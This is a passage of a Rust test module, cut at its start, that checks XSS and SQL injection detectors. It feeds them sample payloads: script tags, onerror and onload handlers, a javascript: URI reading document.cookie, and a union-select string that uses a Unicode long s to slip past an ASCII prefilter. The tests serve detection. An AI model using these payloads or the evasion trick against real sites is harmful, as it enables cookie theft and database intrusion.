        let (hit, fp) = detect_xss("<script>alert(1)</script>");
        assert!(hit);
        assert!(fp.contains("script-tag"));
    }

    #[test]
    fn detect_xss_onerror() {
        let (hit, fp) = detect_xss("<img src=x onerror=alert(1)>");
        assert!(hit);
        assert!(fp.contains("event-handler"));
    }

    #[test]
    fn detect_xss_javascript_uri() {
        let (hit, fp) = detect_xss("javascript:alert(document.cookie)");
        assert!(hit);
        assert!(fp.contains("js-uri"));
    }

    #[test]
    fn detect_xss_benign() {
        let (hit, _fp) = detect_xss("hello world");
        assert!(!hit);
    }

    #[test]
    fn detect_xss_svg_onload() {
        let (hit, fp) = detect_xss("<svg onload=alert(1)>");
        assert!(hit);
        assert!(fp.contains("dangerous-tag"));
    }

    #[test]
    fn detect_sqli_unicode_folding_takes_full_path() {
        // `ſ` (long s) Unicode-folds to `s`, so the regex still fires even
        // though the ASCII-folded prefilter would miss `ſelect`. Non-ASCII
        // input must therefore bypass the prefilter entirely.
        let (hit, fp) = detect_sqli("1 union ſelect password");
        assert!(hit);
        assert!(fp.contains("union-select"));
    }

    #[test]
    fn detect_xss_mixed_case_passes_prefilter() {
        let (hit, fp) = detect_xss("<IMG SRC=x ONERROR=alert(1)>");
        assert!(hit);
        assert!(fp.contains("event-handler"));
    }
}
